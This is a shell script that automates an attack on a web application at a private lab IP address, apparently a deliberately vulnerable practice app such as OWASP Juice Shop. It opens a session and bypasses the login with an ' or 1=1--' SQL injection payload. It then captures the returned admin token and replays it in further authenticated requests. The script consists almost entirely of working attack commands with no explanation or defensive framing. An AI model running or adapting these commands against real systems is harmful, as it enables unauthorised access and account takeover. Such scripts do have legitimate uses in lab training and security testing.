#/bin/sh

# Retrieve absolute path to this script
script=$(readlink -f $0)
scriptpath=`dirname $script`

# Define host IP ( the machine to attack ) and remote IP ( the machine which supports the attack )
target_ip="10.10.210.134"
attack_ip="10.10.170.39"

# Prepare environment
mkdir /work/ 2>/dev/null

# Initiate session
echo "1 - INITIATING SESSION"
curl -s -X GET "http://$target_ip" -L > /dev/null
curl -s -X GET "http://$target_ip/socket.io/?EIO=3&transport=polling&t=PE7d5_o" -c "/work/1-cookies.txt" -L
IO=$(grep io "/work/1-cookies.txt" | awk '{print $7}')
echo "--> Session initiated with cookie IO ${IO}"
echo -e "\n$target_ip\tFALSE\t/\tFALSE\t0\tlanguage\ten" >> /work/1-cookies.txt
echo -e "\n$target_ip\tFALSE\t/\tFALSE\t0\tcookieconsent_status\tdismiss" >> /work/1-cookies.txt
sleep 2
curl -s -X GET "http://$target_ip/socket.io/?EIO=3&transport=polling&t=PE7d6Aw&sid=$IO" -b "/work/1-cookies.txt" -L

# Authenticate using SQL injection session
echo "2 - AUTHENTICATE THROUGH INJECTION"
curl -s -X POST "http://$target_ip/rest/user/login" -b "/work/1-cookies.txt" -L -H "Content-Type: application/json" -d "{\"email\":\"' or 1=1--'\",\"password\":\"a\"}" -o /work/1-admin.json
TOKEN=$(jq -r '.authentication.token' /work/1-admin.json)
echo "--> Authenticated with token ${TOKEN}"
echo -e "\n$target_ip\tFALSE\t/\tFALSE\t0\ttoken\t$TOKEN" >> /work/1-cookies.txt

# Gather authentication token
curl -s -X GET "http://$target_ip/rest/user/whoami" -b "/work/1-cookies.txt" -v -L
curl -s -X GET "http://$target_ip/socket.io/?EIO=3&transport=polling&t=PE7dLN0&sid=$IO" -b "/work/1-cookies.txt" -v -L
curl -s -X GET "http://$target_ip/socket.io/?EIO=3&transport=polling&t=PE7dLN0&sid=$IO" -b "/work/1-cookies.txt" -v -L
curl -s -X GET "http://$target_ip/socket.io/?EIO=3&transport=polling&t=PE7dLN0&sid=$IO" -b "/work/1-cookies.txt" -v -L